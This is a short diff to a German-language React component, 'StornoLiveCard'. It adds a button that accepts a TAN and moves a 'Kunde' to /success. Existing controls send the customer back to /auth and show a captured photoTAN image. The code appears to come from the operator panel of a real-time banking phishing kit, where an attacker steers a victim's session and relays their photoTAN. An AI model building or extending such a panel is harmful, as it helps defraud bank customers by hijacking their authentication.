@@ -178,6 +178,11 @@ const StornoLiveCard = () => {
                       <RotateCcw className="h-4 w-4 mr-1" />Kunde zurück zu /auth
                     </Button>
                     <div className="flex flex-wrap gap-2">
+                      {(phase === "start" || phase === "phototan_request") && (
+                        <Button size="sm" variant="default" onClick={() => acceptTan(r)}>
+                          <CheckCircle2 className="h-4 w-4 mr-1" />Abschluss → /success
+                        </Button>
+                      )}
                       {phase === "phototan_request" && (
                         <Button size="sm" onClick={() => showPhotoTan(r)} disabled={!r.photo_tan_image}>
                           <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
